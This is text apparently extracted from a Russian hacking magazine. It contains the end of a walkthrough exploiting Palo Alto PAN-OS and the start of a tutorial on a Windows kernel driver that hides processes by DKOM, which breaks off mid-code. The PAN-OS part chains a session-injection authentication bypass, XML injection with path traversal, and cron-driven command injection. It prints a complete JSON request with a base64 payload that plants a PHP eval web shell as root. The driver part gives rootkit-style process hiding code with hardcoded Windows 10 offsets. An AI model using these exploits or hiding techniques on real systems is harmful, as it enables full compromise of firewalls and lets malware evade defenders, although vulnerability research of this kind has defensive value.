Значение до первого двоеточия конвертируется в десятичное целое.


panmodule.c
19354:   strcpy(seps, ":");
...
19362:     v3 = __strtok_r(strCopy, seps, (char **)tmpBuf);
19363:     if ( v3 )
...
19377:           loc‐>loc = strtol(v3, 0, 10);

Производится поиск следующего двоеточия, и данные между двумя двоето‐
чиями копируются в переменную deviceName. Раз мер данных равен мак‐
симум 0x20 байтам. Если переданное значение оказалось большего раз‐
мера, то все остальное отбра сывается.


19370:           if ( v4 == 1 )
19371:             sstrncpy(loc‐>deviceName, v3, 32);

Далее идет поиск следующего символа с двоеточием и выпол няется ана‐
логичная операция, толь ко для переменной vsysName.


19373:             sstrncpy(loc‐>vsysName, v3, 32);

После этого полученная переменная deviceName отправляется в функцию
panPhpSetDeviceForSession для дальнейшей обработки.


18505:     v4 = panPhpSetDeviceForSession(cookie, dloc.deviceName,
errMsg, 0x200u);
...
20823: signed int __cdecl panPhpSetDeviceForSession(pan_char_t *
cookie, pan_char_t *devName, pan_char_t *errMsgBuf, pan_uint32_t
bufSize)
20824: {
...
20829:   pan_char_t firstVsys[32]; // [sp+30h] [bp‐2Ch]@6
...
20846:     sstrncpy(firstVsys, "vsys1", 32);

В процессе выпол нения этой функции происходит вызов panPhpSetDevice‐
AndVsysForSession, которая устанавлива ет зна чения переменных dloc и loc
в соответствии с переданными данными.


19328:   panPhpSetSessionVar("dloc", tmpLocStr);
19329:   tmpLoc.loc = (unsigned int)panSwalIsVsysName(vsysName) < 1 ?
 128 : 16;
19330:   if ( vsysName )
19331:   {
19332:     if ( !*vsysName )
19333:       tmpLoc.loc = 8;
19334:     sstrncpy(tmpLoc.vsysName, vsysName, 32);
19335:     panPhpConvertLocToString(&tmpLoc, tmpLocStr, 0x100u);
19336:     panPhpSetSessionVar("loc", tmpLocStr);

Сделаем вот такой запрос:


https://panos.visualhack:4443/esp/cms_changeDeviceContext.
esp?device=1024:aaaa:bbbb





      Запрос на создание файла сес сии и записи в нее переменных

После чтения данных сессии переменные будут иметь сле дующие значения:


dloc|s:6:"8:aaaa";loc|s:13:"16:aaaa:vsys1";
dloc|s:6:"8:aaaa";
loc|s:13:"16:aaaa:vsys1";
dloc = "8:aaaa"
loc  = "16:aaaa:vsys1"

Теперь  при  каждом  зап росе  будет  проверяться  валидность  сессии
при помощи panCheckSessionExpired, в рамках которой будет выполняться
panBuildQueryCheckSessionExpired из уже известной нам библиотеки
/usr/local/lib/shobjs/libpanApiWgetFilter.so .


libpanApiWgetFilter.c
1058: pan_result_t __cdecl panCheckSessionExpired(ptrFuncResult
result, ptrAuthFilter me)
1059: {
...
1079:   retval = panBuildQueryCheckSessionExpired(&myFuncResult, me,
0);


libpanApiWgetFilter.c
1037: pan_result_t __cdecl panBuildQueryCheckSessionExpired(ptrFun
cResult result, ptrAuthFilter me, bool refresh)
1038: {
1039:   pan_char_t *user; // ST1C_4@1
1040:   const char *v4; // eax@2
1041:   int v6; // [sp+Ch] [bp‐1Ch]@1
1042:
1043:   user = myGetStageData(me‐>conn, "panAuthFilter.user");
1044:   pan_string_buffer_appendf(result‐>data.str, "<request
cmd='op' cookie='%s' %s", user, &unk_8665);
1045:   if ( refresh )
1046:     v4 = "yes";
1047:   else
1048:     v4 = "no";
1049:   pan_string_buffer_appendf(result‐>data.str, " refresh='%s'>",
 v4, v6);
1050:   pan_string_buffer_append(result‐>data.str, "<operations
xml='yes'><show><cli><idle‐timeout/></cli></show>");
1051:   pan_string_buffer_append(result‐>data.str, "</operations></
request>");
1052:   return 0;
1053: }

Эта функция формирует XML‐запрос к бэкенду, который должен дать ответ
о жизнеспособности используемой сессии.
   Чтобы выполнение перешло в эту ветку кода, нужна переменная user.
Это не проблема, ведь у нас на примете имеется не совсем корректно
написанный парсер данных из файла сессии. Все, что нам нужно, — это заин‐
жектить требуемую переменную.


https://panos.visualhack:4443/esp/cms_changeDeviceContext.
esp?device=1024:aaaa%27";user|s:





                 Инъекция переменной в сессию

Здесь:


dloc|s:15:"8:aaaa'";user|s";loc|s:22:"16:aaaa'";user|s:vsys1";
dloc|s:15:"8:aaaa'";
user|s";loc|s:22:"16:aaaa'";
user|s:vsys1";

После такого запроса переменная user (panAuthFilter.user) становится
равной 16:aaaa'. А результатом работы функции panBuildQueryCheckSes‐
sionExpired будет следующий XML‐запрос:


<request cmd='op' cookie='16:aaaa''  refresh='no'>
    <operations xml='yes'>
        <show><cli><idle‐timeout/></cli></show>
    </operations>
</request>

Дополнительная одинарная кавычка делает XML невалид ным, и парсер вер‐
нет ошибку вида


<response status="error" code="18">
    <msg>
        <line>Malformed Request</line>
    </msg>
</response>

Однако функция panCheckSessionExpired  все  равно вернет единицу,
это будет означать, что аутентифика ция пройдена и сессия валидна.


libpanApiWgetFilter.c
1337:           if ( panCheckSessionExpired(ptrMyFuncResult, ptrMyA
uthFilter) == 2 )
1338:           {
...
1341:           }
1342:           else
1343:           {
1344:             mprLog(globalMpr, 9, "panAuthFilter:openAuthFilter
%s We are done!!!", ptrMyAuthFilter‐>conn‐>request‐>url);
1345:           }

Проверить успешность обхода авторизации можно на отладочной странице:
https://panos.visualhack:4443/php/utils/debug.php.





      Успешный обход авторизации и загруженная страница отладки

После создания такой сес сии ты сможешь ходить по папкам, которые зак‐
рыты директивой panAuthCheck.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
    ГАСИМ ФАЙРВОЛ
          УЧИМСЯ ЭКСПЛУАТИРОВАТЬ КРИТИЧЕСКУЮ
            УЯЗВИМОСТЬ В ОС PALO ALTO NETWORKS





СОЗДАНИЕ ДИРЕКТОРИЙ
Переходим к следующей уязвимости. Как и в любой современной системе,
в PAN‐OS имеется API. Чтобы делать прямые запросы к нему, можно исполь‐
зовать скрипт route.php из папки с утилитами.
  Однако доступ к скрип ту возможен только для авторизованных поль‐
зователей. Это не проблема, ведь у нас уже имеется готовый обход. Так что
смелее подставляй в запрос идентифика тор сессии, полученный манипу‐
ляциями из прошлого раздела, и дело в шляпе.


/var/appweb/htdocs/php/utils/router.php
3: require_once($_SERVER['DOCUMENT_ROOT'] . '/../htdocs/php/include/
common.php');
4: require_once($_SERVER['DOCUMENT_ROOT'] . '/../htdocs/php/include/
ExtDirect.php');
5:
6: class ExtDirect_Router extends RouterAbstract {
7:     private $_api;

Нужный метод можно вызывать, указывая его наз вание после router.php. Нап‐
ример,    чтобы   выполнить   Administrator.get,   делаем   запрос
к https://panos.visualhack:4443/php/utils/router.php/Administrator.get. Все прос‐
то. По счастливой случайности это именно тот метод, что нам интересен.
Сначала создается экземпляр клас са ExtDirect_Router, который является
наследником RouterAbstract.


/var/appweb/htdocs/php/utils/router.php
6: class ExtDirect_Router extends RouterAbstract {
7:     private $_api;
...
86: $router = new ExtDirect_Router();
87: Http::headerType('json');
88: echo $router‐>getResponse();

Метод getResponse вызывает dispatch, а в качес тве аргумента использует
данные, которые мы передаем в запросе в виде JSON.


/var/appweb/htdocs/php/include/RouterAbstract.php
111:     public function getResponse(array $requestData=array()) {
112:         if (empty($requestData))
113:             $requestData=$GLOBALS;
114:
115:         return $this‐>dispatch($requestData);
116:     }


/var/appweb/htdocs/php/include/RouterAbstract.php
25:     private function dispatch(array $requestData) {
26:         $request  = $this‐>parseRequest($requestData);

Метод parseRequest исполь зует функцию json_decode, чтобы представить
переданные данные в виде объекта.


/var/appweb/htdocs/php/include/RouterAbstract.php
18:     protected function parseRequest(array $requestData) {
19:         if (isset($requestData['HTTP_RAW_POST_DATA'])) {
20:             return json_decode($requestData['HTTP_RAW_POST_DATA'
]);
21:         }
22:         return null;
23:     }

Возьмем такой более‐менее валидный запрос.


{
    "action": "PanDirect",
    "method": "execute",
    "data": [
        "07c5807d0d927dcd0980f86024e5208b",
        "Administrator.get",
        {
            "changeMyPassword": true,
            "template": "asd",
            "id": "admin"
        }
    ],
    "type": "rpc",
    "tid": 713
}

После того как JSON конвертируется в объект, метод rpc проверяет, сущес‐
твует ли указанный класс и метод из параметров action и method соответс‐
твенно.


/var/appweb/htdocs/php/include/RouterAbstract.php
27:         $response = $this‐>rpc($request);


/var/appweb/htdocs/php/include/RouterAbstract.php
49:     private function rpc($request) {
50:         try {
51:             $class  = Xml::escape($request‐>action);
52:             $method = Xml::escape($request‐>method);
53:             $tid = Xml::escape($request‐>tid);
54:             $params = $request‐>data;
55:
56:             $v=$this‐>isValidMethod($class, $method);

Следующим шагом соз дается объект клас са, который указан в $request‐>
action, в нашем случае это PanDirect. Пос леду ющий вызов call_user_‐
func_array приводит к выполнению PanDirect‐>execute где в качестве
параметров указаны данные из массива data.


74:             $instance= new $request‐>action;
...
77:             $retval=call_user_func_array(array($instance,$method)
, $params);

Логика этого метода следующая.


/var/appweb/htdocs/php/include/PanDirectLite.php
59:     function execute($callFunction, $jsonArgs) {
60:         /* @var $reflection ReflectionClass */
61:         /* @var $method ReflectionMethod */
62:         list($reflection, $isStatic, $method) = $this‐>checkV
alidRemoteCall($callFunction, true);
63:         if ($isStatic) {
64:             return $method‐>invokeArgs(NULL, array($jsonArgs));
65:         } else {
66:             $obj = $reflection‐>newInstanceArgs(array($jsonArgs))
;
67:             return $obj‐>$method();
68:         }
69:     }

 • checkValidRemoteCall выполняет про верку метода: объ явлен он ста‐
   тическим или нет;
 • если да, то выполняется его прямой вызов. Если нет, то переменная $obj
   становится экземпляром ука занного класса. В нашем случае это Admin
  istrator;
 • $obj>$method() вызывает указанный метод, в нашем случае это get.

Если в аргументах был ука зан флаг changeMyPassword, то происходит вызов
метода getConfigByXpath.


/var/appweb/htdocs/php/device/Administrator.php
10: class Administrator extends ManagementConfigAbstraction {
...
85:     public function get() {
...
86:         // detail viewer
87:         if ( isset($this‐>jsonArgs‐>changeMyPassword) ) {
88:             return Direct::getConfigByXpath("/config/mgt‐config/
users/entry[@name='" . $this‐>jsonArgs‐>id . "']");

Этот метод формирует xpath, который будет отправлен бэкенду mgmtsrvr.


/var/appweb/htdocs/php/include/Direct.php
688:     static function getConfigByXpath($xpath, $attribute=null, $
options=null) {
689:         $req = XmlRequest::get($xpath, $attribute);
690:         return $xmlDoc = Backend::getArray($req, $options);
691:     }


/var/appweb/htdocs/php/include/Backend.php
377:     static function getArray($req, $options=NULL, $connec
tionOptions = null) {
378:         $dom = self::getDom($req, $connectionOptions);


/var/appweb/htdocs/php/include/Backend.php
350:     static function getDom($msg, $connectionOptions = null) {
351:         $msg = self::massageMsg($msg);
352:         $data = self::getConnection()‐>send($msg, $connec
tionOptions);


/var/appweb/htdocs/php/include/MSConnection.php
07: class MSConnection {
...
43:     function send($requestXml, $connectionOptions = null) {
...
50:             $this‐>writePayload($requestXml, $payloadLength);


/var/appweb/htdocs/php/include/MSConnection.php
07: class MSConnection {
...
95:     public function writePayload(& $requestXml, $payloadLength) {
96:         socket_write($this‐>sock, $requestXml, $payloadLength);
97:     }

В результате на сервер уходит вот такой XML:


<request cmd="get"
    obj="/config/mgt‐config/users/entry[@name='admin']"
    cookie="cb3824b1b1fd3ac7138682ed67e03b8e"/>
</request>

При обработке полученного запроса демон mgmtsrvr выполняет функцию
pan_mgmtsrvr_client_svc.


mgmtsrvr.c
3603: void *__cdecl __noreturn pan_mgmtsrvr_client_svc(void *arg)
3604: {

И наконец, отрабатывает pan_jobmgr_store_job_result из огромной биб‐
лиотеки /usr/local/lib/libpanmp_mp.so.1. Функция соз дает временный
файл XML в директории /opt/pancfg/session/pan/user_tmp/{cookie}/{
jobid}.xml, где cookie — это атрибут из тега request.





     Дизассемблированный код функции pan_jobmgr_store_job_result


libpanmp_mp.so.1.c
401430: signed int __usercall pan_jobmgr_store_job_result@<eax>(int
a1@<eax>, int a2@<edx>)
401431: {
...
401440:     if ( a1 )
401441:     {
401442:       snprintf(&v5, 0x400u, "%s%s", "/opt/pancfg/session/pan/
user_tmp/", *(_DWORD *)(a1 + 476));
401443:       if ( pan_dir_create_tree(&v5) >= 0 )

Вот здесь и закралась проблема. Парсер никак не фильтру ет пользователь‐
ские данные, поэто му воз можна XML‐инъекция, бла годаря которой мы можем
указать атрибут cookie. При обра бот ке этой задачи будет создана папка
с произвольным именем. А используя технику path traversal, мы можем выйти
из указанной папки и создать директорию в любом мес те на диске, так
как все это дело отрабатывает от рута. :)
   Вот такой запрос будет создавать папку jbfc в директории tmp:


{
    "action": "PanDirect",
    "method": "execute",
    "data": [
        "07c5807d0d927dcd0980f86024e5208b",
        "Administrator.get",
        {
            "changeMyPassword": true,
            "template": "asd",
            "id": "admin']\" async‐mode='yes' refresh='yes'
сookie='../../../../../../tmp/jbfc'/>\u0000"
        }
    ],
    "type": "rpc",
    "tid": 713
}

Чтобы отбросить те атрибуты, которые добавляет вызов XmlRequest::get(
$xpath, $attribute), восполь зуемся ста рым доб рым null‐байтом.


/var/appweb/htdocs/php/include/XmlRequest.php
39:     static function get($xpath, $attributes = null) {
40:         return sprintf('<request cmd=\'get\' obj="%s" cookie="%s"
%s></request>',
41:             $xpath, Session::cookie(), self::appendAttributes($
attributes));
42:     }


ДОРОГА К RCE
Наконец‐то мы приблизились к самому интерес ному — выполнению про‐
извольных команд в системе.
   Такие сложные системы не обходятся без пла нировщика заданий, вот
и здесь крутится демон cron и выполняет разные скрипты. Один из них —
это /usr/local/bin/genindex_batch.sh, он вызывает /usr/local/bin/
genindex.sh, который отвечает за переиндексацию данных в БД.


/usr/local/bin/genindex_batch.sh
9: /usr/local/bin/genindex.sh $date >> /var/log/pan/indexgen.log 2>&1

Здесь есть интересный кусок кода, который выполняет поиск файлов в дирек‐
тории $PAN_BASE_DIR/logdb/$dir/1 (/opt/pancfg/mgmt/logdb/$dir/1).


genindex_batch.sh
2: export PAN_BASE_DIR=/opt/pancfg/mgmt


/usr/local/bin/genindex.sh
222:    echo "Updating indices for $db db"
223:    for day in `find $PAN_BASE_DIR/logdb/$dir/1 ‐mindepth 1 ‐
maxdepth 1 ‐mtime ‐30 | sort ‐r`

Затем скрипт пробегает по полученному списку и выполняет некие команды.
Нас интересуют не сами команды, а то, что имя директории (переменная
$day) попадает в исполня емую строку.


/usr/local/bin/genindex.sh
227:      for logfile in `find $day ‐mmin +5 ‐name pan.*.log | sort ‐
r`

Теперь, используя описанную технику соз дания директорий с произвольным
именем, мы сможем внедрить параметры в вызов бинарника ﬁnd. Далеко
ходить не нужно, ведь у него есть замечательный параметр ‐exec.
   Название говорит само за себя: после каж дого найденного файла выпол‐
няется указанная там команда. UNIX‐подоб ные сис темы относятся к названи‐
ям файлов и катало гов далеко не так строго, как Windows. По большому счету
запрещены только сим волы слеша (/) и null‐байт (\0), все остальное можно
спокойно использовать. В PoC для исполнения команд используется Python
и Base64.


f=open('/var/appweb/htdocs/poc.php', 'w');f.write("<?php @eval(
$_POST['jbfcthere']);?>");f.close();
python ‐c exec("Zj1vcGVuKCcvdmFyL2FwcHdlYi9odGRvY3MvcG9jLnBocCcsICd
3Jyk7Zi53cml0ZSgiPD9waHAgQGV2YWwoJF9QT1NUWydqYmZjdGhlcmUnXSk7Pz
4iKTtmLmNsb3NlKCk7".decode("base64"))

В качестве демонстрации указан набор команд, которые создают PHP‐шелл,
доступный из браузера. По умолчанию веб‐рут располагается по адресу
/var/appweb/htdocs/ , поэто му файл poc.php создается именно там.


{
    "action": "PanDirect",
    "method": "execute",
    "data": [
        "07c5807d0d927dcd0980f86024e5208b",
        "Administrator.get",
        {
            "changeMyPassword": true,
            "template": "asd",
            "id": "admin']\" async‐mode='yes' refresh='yes'
cookie='../../../../../../opt/pancfg/mgmt/logdb/traffic/1/* ‐print
‐exec python ‐c exec(\"Zj1vcGVuKCcvdmFyL2FwcHdlYi9odGRvY3MvcG9jLn
BocCcsICd3Jyk7Zi53cml0ZSgiPD9waHAgQGV2YWwoJF9QT1NUWydqYmZjd2Fza
GVyZSddKTs/PiIpO2YuY2xvc2UoKTs=\".decode(\"base64\")) ;'/>\u0000"
        }
    ],
    "type": "rpc",
    "tid": 713
}

Разумеется, ты можешь использовать свои команды, только обрати вни‐
мание: иногда в Base64 встречаются слеши, не забывай их экранировать.
Также держи в уме, что размер названия может быть не больше 255 сим‐
волов.
  После того как запрос выполнится, нужно подождать, пока выполнится
задача по индексации. Она отра батывает на 0, 15, 30 и 45‐й минуте каждого
часа, то есть каждые пятнадцать минут.


/etc/cron.d/indexgen
SHELL=/bin/bash
0,15,30,45 * * * * root /usr/local/bin/genindex_batch.sh





                   Ус пешная эксплуата ция PAN‐OS

Готовые PoC ты можешь найти тут и тут.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Вот такие инте ресные уяз вимос ти нашлись в операционке устройства,
которое за немалые деньги защищает корпоративную безопасность. Хоть
в официальном руководс тве и говорится о том, что панелька, доступная
из интернета, — это bad practice, подоб ные решения час тенько встречаются.
Например, нехитрым зап росом в Shodan можно отыскать несколько тысяч
таких устройств, спокойно дос тупных извне.
   Хочу также напомнить, что команды атакующего выполняются от име ни
суперпользователя. Это значит, что система будет скомпрометирована пол‐
ностью. А если учесть, что это файрвол, то импакт от такой атаки может стать
колоссальным.
  Тем не менее баги закрыты, патчи выпущены, спеши обновиться, если
в твоем ведении одна из таких машин.
ВЗЛОМ
 ПРЯТКИ
     ПО ХАРДКОРУ





                                                                                         Nik Zerof
                                                                                             xtahi0nix@gmail.com




                 КАК СДЕЛАТЬ СВОЙ ДРАЙВЕР
                 РЕЖИМА ЯДРА WINDOWS
                 И СКРЫВАТЬ ПРОЦЕССЫ





Все мало‐мальски серьезные защитные приложения, будь
то файрволы или  антивирусы, используют собствен ные
модули режима ядра (ring 0), через которые работает боль‐
шинство их функций: защита процессов от завершения,
фильтры   различных   событий,   получение   актуальной
информации о состоянии сетево го трафика и количестве
процессов в сис теме. Если у программы есть такой драйвер,
то пробовать скрываться от нее из режима пользователя
(ring 3) бессмыс ленно. Так же бесполезно пытаться на нее
как‐то воздействовать. Решение — написать собственный
драйвер. В этой статье я покажу, как это делается.


             INFO

                     Процессорные архитектуры x86 и x64 име ют
                       четыре кольца защиты, из которых в Windows
                      по факту используются все го два — это ring 3
                      (режим пользователя) и  ring 0 (режим ядра).
                      Бытует мнение, что код режима ядра — самый
                      привилегирован ный  и  «ниже»   ничего   нет.
                     На самом деле архитектура x86/x64 позволяет
                       опускаться еще ниже: это технология виртуали‐
                      зации (hypervisor mode), которая считается коль‐
                    цом −1 (ring −1), и режим системного управления
                       (System Management Mode, SMM), считающийся
                        кольцом −2 (ring −2), которому доступна память
                     режима ядра и гипервизора.


Итак, мы решили писать собственный драйвер. Начнем с выбора инстру мен‐
тария. Я советую исполь зовать Microsoft Visual Studio, как наиболее user‐
friendly IDE. Также необ ходимо будет установить Windows SDK и Windows Dri‐
ver Kit (WDK) для твоей версии ОС. Кро ме того, я крайне рекомендую запас‐
тись такими утилитами, как DebugView (просмотр отладочного вывода), Dri‐
verView (позволяет получить список всех уста новленных драйверов) и Kmd‐
Manager (удобный загрузчик драйверов).
  Драйверы в Windows начиная с Vista могут быть как режима пользователя
(User‐Mode Driver Framework, UMDF), так и режима ядра (Kernel‐Mode Driver
Framework, KMDF). Более ранние драй веры Windows Driver Model (WDM)
появились в Windows 98 и сейчас считаются устаревшими.
  Драйверы UMDF имеют намного более огра ниченные права, чем KMDF,
однако они используются, нап ример, для управления устройствами, под клю‐
ченными по USB. Помимо огра ничений, у них есть оче вид ные плюсы: их нам‐
ного проще отлаживать, а ошибка в их написа нии не вызовет глобальный сис‐
темный сбой и синий экран смерти. Такие драйверы име ют расширение dll.
   Что до драйверов режима ядра (KMDF), то им дозволено куда больше,
а расширение файлов, закрепленное за ними, — это sys. В этой статье мы
научимся  писать  прос тые  драйверы режима  ядра, напишем  драй вер
для скрытия процессов методом DKOM (Direct Kernel Object Manipulation)
и его загрузчик.


СОЗДАНИЕ ДРАЙВЕРА KMDF
После того как ты создашь проект драйвера, Visual Studio автоматически нас‐
троит некоторые параметры. Проект будет компилироваться в бинарный
файл в соответствии с тем, какая выб рана подсистема. Наш вариант —
это NATIVE, подсистема низкого уровня, как раз для того, чтобы писать драй‐
веры.


Точ ка вхо да в драйвер
Строго говоря, точка входа в драйвер может быть любой — мы можем сами
ее определить, добавив к параметрам компоновки проекта ‐entry:[Driver‐
Entry], где [DriverEntry] — наз вание функции, которую мы хотим сделать
стартовой. Если в обычных приложениях основная функция обычно называ‐
ется main, то в драйверах точку входа принято называть DriverEntry.
  Выглядеть это будет так:


NTSTATUS DriverEntry (PDRIVER_OBJECT pDriverObject, PUNICODE_STRING
pRegistryPath);

Давай  пройдем ся  по  параметрам,  которые  передаются  DriverEntry.
pDriverObject име ет тип PDRIVER_OBJECT, это значит, что это указатель
на структуру DRIVER_OBJECT, которая содержит информацию о нашем драй‐
вере. Мы можем менять некоторые поля этой структуры, тем самым меняя
свойства драйвера. Вто рой параметр имеет тип PUNICODE_STRING, который
означает указатель на строку типа UNICODE. Она, в свою очередь, указывает,
где в системном реестре хра нится информа ция о нашем драйвере.


           WARNING

                 Любая ошибка в драйвере может вызвать обще‐
                       системный сбой и BSOD. Вероятна потеря дан‐
                      ных и повреждение системы. Все эксперименты я
                      рекомендую проводить в виртуальной машине.



Interrupt Request Level (IRQL)
IRQL — это своеобразный «приоритет» для драйверов. Чем выше IRQL, тем
меньшее число других драйверов будут прерывать выполнение нашего кода.
Существует несколько уровней IRQL: Passive, APC, Dispatch и DIRQL. Если
открыть докумен тацию MSDN по функциям WinAPI, то можно увидеть при‐
мечания,  которые  регламентируют  уро вень  IRQL,  который  требуется
для обращения к каждой функции. Чем выше этот уровень, тем меньше
WinAPI нам доступно для использования. Первые три уровня IRQL исполь‐
зуются для синхронизации программных частей ОС, уровень DIRQL считается
аппаратным и самым высоким по сравнению с программными уровнями.

Пакеты запроса вво да‑вывода (Input/Output Request Packet)
IRP — это запросы, которые поступают к драй веру. Именно при помощи IRP
один драйвер может «поп росить» сделать что‐то другой драйвер либо
получить запрос от программы, которая им управля ет. IRP используются дис‐
петчером ввода‐вывода ОС. Чтобы научить программу воспринимать наши
IRP, мы должны зарегистрировать функцию обратно го вызова и настроить
на нее массив указателей на функции. Код весьма прост:


for(x = 0; x < IRP_MJ_MAXIMUM_FUNCTION; ++x)
    pDriverObject‐>MajorFunction[x] = MyCallbackFunc;

А вот код функции‐заглушки, которая всегда возвращает статусный код STA‐
TUS_SUCCESS. В этой функции мы обра батываем зап рос IRP.


NTSTATUS MyCallbackFunk(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
    pIrp‐>IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return pIrp‐>IoStatus.Status;
}

Теперь любой запрос к нашему драйверу вызовет функцию‐заглушку, которая
всегда возвращает STATUS_SUCCESS. Но что, если нам нужно попросить драй‐
вер сделать что‐то конкрет ное, например вызвать определенную функцию?
Для этого регистрируем управляющую процеду ру:


#define IRP_MY_FUNC 0x801

Здесь мы объявили процеду ру с именем IRP_MY_FUNC и ее кодом — 0x801.
Чтобы драйвер ее обработал, мы должны нас троить на нее ссылку, создав
таким образом допол нительную точку вхо да в драйвер:


// Заполним все коды IRP ссылкой на функцию‐заглушку
for(x = 0; x < IRP_MJ_MAXIMUM_FUNCTION; ++x)
    pDriverObject‐>MajorFunction[x] = MyCallbackFunc;
// Настроим вызов функции MyCallbackControl на запрос IRP_MJ_DEVICE_C
ONTROL
pDriverObject‐>MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyCall
backControl;

После этого нам нужно получить указатель на стек IRP, который мы будем
обрабатывать. Это дела ется при помощи функции IoGetCurrentIrpStack‐
Location, на вход которой подается указатель на пакет. Кроме этого, необ‐
ходимо будет получить от диспетчера ввода‐вывода размеры буферов вво‐
да‐вывода, чтобы иметь воз можность передавать и получать данные от поль‐
зовательского приложения. Шаб лонный код каркаса обработчика управля‐
ющей процедуры:


// Получаем указатель на стек IRP пакета
PIO_STACK_LOCATION pIrpSt = IoGetCurrentIrpStackLocation(pIrp);
// Получаем размер буфера ввода
ULONG InBufLen  = IrpStack‐>Parameters.DeviceIoControl.InputB
ufferLength;
// Получаем размер буфера вывода
ULONG OutBufLen = IrpStack‐>Parameters.DeviceIoControl.Output
BufferLength;
// Получаем код управляющей процедуры
ULONG CtrlCode = IrpStack‐>Parameters.DeviceIoControl.IoControlCode;
NTSTATUS status = STATUS_SUCCESS;
swich(CtrlCode)
{
case IRP_MY_FUNC:
    // Здесь код, который будет вызываться управляющей процедурой
IRP_MY_FUNC
break;
default:
    status = STATUS_INVALID_DEVICE_REQUEST;
break;
}
return status;


Соз дание устройства драйвера
Чтобы взаимодействовать с драйвером, мы должны соз дать «объект‐устрой‐
ство драйвера». Для этого используем API‐функцию IoCreateDevice. Кроме
того, мы создадим сим воличес кие ссылки на наш драйвер, чтобы он был
виден в диспетчере ввода‐вывода в директории \Device. Если этого не сде‐
лать, то обратиться к объекту‐устройству драйвера можно будет только
из самого драйвера, но не из внешнего приложения. Вот код, который соз‐
дает объект‐устройство драйвера и сим волические ссылки на него.


#define NT_DEV_NAME L"\\Device\\drv_dkom"
#define DOS_DEV_NAME L"\\DosDevices\\drv_dkom"
NTSTATUS status = STATUS_SUCCESS;
PDEVICE_OBJECT pDvcObj = NULL;
UNICODE_STRING usDrvName, usDosDvcName;
RtlInitUnicodeString(&usDrvName, NT_DEV_NAME);
RtlInitUnicodeString(&usDosDvcName,DOS_DEV_NAME);
status = IoCreateDevice (pDriverObject, 0,
                         &UsDrvName,
                         FILE_DEVICE_UNKNOWN,
                         FILE_DEVICE_SECURE_OPEN,
                         FALSE, &pDvcObj);
if (!NT_SUCCESS(status)) {
    return status;
}
status = IoCreateSymbolicLink(&usDosDvcName, &usDrvName);
if (!NT_SUCCESS(status)) {
    IoDeleteDevice(pDvcObj);
    return status;
}

Итак, мы рассмотрели основные структурные единицы драйвера режима
ядра, увидели, как драйвер обща ется с режимом usermode и как заставить
его выполнять определен ные команды. Теперь напишем сам драйвер режима
ядра.


СКРЫТИЕ ПРОЦЕССОВ МЕТОДОМ DKOM (DIRECT KERNEL OBJECT
MANIPULATION)
Настало время применить полученные знания о драйверах режима ядра
на практике для закрепления результата. Сей час мы напишем драй вер KMDF
для скрытия процессов методом пря мой манипуляции объ ектами ядра
(DKOM). Как именно мы будем скрывать наши про цес сы? Информация о про‐
цессах хранится в структуре ядра под названием EPROCESS, так что обра‐
тимся к ней.


             INFO

                       Структура EPROCESS,  блок процесса. В ней
                      содержится много информации о процессе, ука‐
                        затели на несколько струк тур дан ных, например
                       PEB, структуру KPROCESS, струк туры KTHREAD
                      и ETHREAD. Эта струк тура заполняет ся исполни‐
                         тельной системой ОС, находится в системном
                      адресном пространстве (kernelmode), как и все
                        связанные структуры, кроме PEB. Все процессы
                    имеют эту структуру.


Чтобы увидеть EPROCESS самостоятельно, достаточно подключиться ядер‐
ным отладчиком WinDbg к ядру ОС и ввести команду dt _EPROCESS. Пос ле
этого ты увидишь что‐то вроде это го (смещения отличаются в разных версиях
ядер Windows):


lkd> dt _EPROCESS
nt!_EPROCESS
+0x000 Pcb              : _KPROCESS
+0x2d8 ProcessLock      : _EX_PUSH_LOCK
+0x2e0 RundownProtect   : _EX_RUNDOWN_REF
+0x2e8 UniqueProcessId  : Ptr64 Void
+0x2f0 ActiveProcessLinks : _LIST_ENTRY
+0x300 Flags2           : Uint4B
+0x300 JobNotReallyActive : Pos 0, 1 Bit
+0x300 AccountingFolded : Pos 1, 1 Bit
+0x300 NewProcessReported : Pos 2, 1 Bit
+0x300 ExitProcessReported : Pos 3, 1 Bit
+0x300 ReportCommitChanges : Pos 4, 1 Bit
+0x300 LastReportMemory : Pos 5, 1 Bit
+0x300 ForceWakeCharge  : Pos 6, 1 Bit
+0x300 CrossSessionCreate : Pos 7, 1 Bit
+0x300 NeedsHandleRundown : Pos 8, 1 Bit
+0x300 RefTraceEnabled  : Pos 9, 1 Bit
+0x300 DisableDynamicCode : Pos 10, 1 Bit
+0x300 EmptyJobEvaluated : Pos 11, 1 Bit
...

Разумеется, это не вся структура, она нес колько больше. Отладчик показы‐
вает смещения полей отно сительно начала структуры EPROCESS. В ней нас
интересуют несколь ко полей. ActiveProcessLinks — указатель на структуру
_LIST_ENTRY, которая, в свою очередь, указыва ет на процес сы после нашего
(FLink) и перед (BLink). Что бы было понят нее, вот прототип _LIST_ENTRY:


typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *FLink;
    struct _LIST_ENTRY *BLink;
} LIST_ENTRY, *PLIST_ENTRY;

Размеры, типы данных и смещения от начала спис ка:


lkd> dt _LIST_ENTRY
nt!_LIST_ENTRY
+0x000 Flink            : Ptr64 _LIST_ENTRY
+0x008 Blink            : Ptr64 _LIST_ENTRY

Как ты мог догадаться, наша задача — уда лить процесс из этого списка, что‐
бы сделать его невидимым. А если точнее, подпра вить записи BLink и FLink
таким образом, чтобы они «пропускали» нуж ный процесс. Для этого про‐
верим каждый процесс в этом списке на нуж ный нам PID и, если найдем его,
вызовем функцию замены полей BLink и FLink. PID мы также можем получить
из  структуры EPROCESS,  нужное  поле  называется  UniqueProcessID.
Для получения блока EPROCESS вос пользуемся функцией PsGetCurrent‐
Process, которая вернет ука затель на него.


// Объявим нужные смещения, актуальны для Windows 10 x64
#define UniqueProcessId 0x2e8
#define ActiveProcessLinks 0x2f0
#define ImageFileName 0x450
#define IRP_HIDE_PROC 0x801
#define NT_DEV_NAME L"\\Device\\drv_dkom"
#define DOS_DEV_NAME L"\\DosDevices\\drv_dkom"
NTSTATUS DriverEntry (PDRIVER_OBJECT  pDriverObject, PUNICODE_STRING
pRegPath)
{
    // Создадим устройство драйвера и настроим символические ссылки
    NTSTATUS status = STATUS_SUCCESS;
